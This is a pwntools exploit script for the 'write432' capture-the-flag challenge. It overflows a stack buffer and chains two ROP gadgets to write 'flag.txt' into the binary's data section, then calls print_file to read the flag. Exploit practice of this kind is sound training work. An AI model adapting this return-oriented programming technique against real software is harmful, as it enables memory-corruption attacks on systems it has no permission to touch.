from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
elf = context.binary = ELF("./write432")

# addresses
a_print_file = p32(elf.symbols["usefulFunction"] + 14)
a_data1 = p32(0x0804a018)
a_data2 = p32(0x0804a01c)

# gadgets
MOV_EDI_EBP = p32(0x08048543) # mov dword ptr [edi], ebp ; ret
POP_EDI_EBP = p32(0x080485aa) # pop edi ; pop ebp ; ret

payload = b"A" * 0x2c

payload += POP_EDI_EBP
payload += a_data1
payload += b"flag"
payload += MOV_EDI_EBP

payload += POP_EDI_EBP
payload += a_data2
payload += b".txt"
payload += MOV_EDI_EBP

payload += a_print_file
payload += a_data1

p = process(elf.path)
p.sendline(payload)
p.interactive()
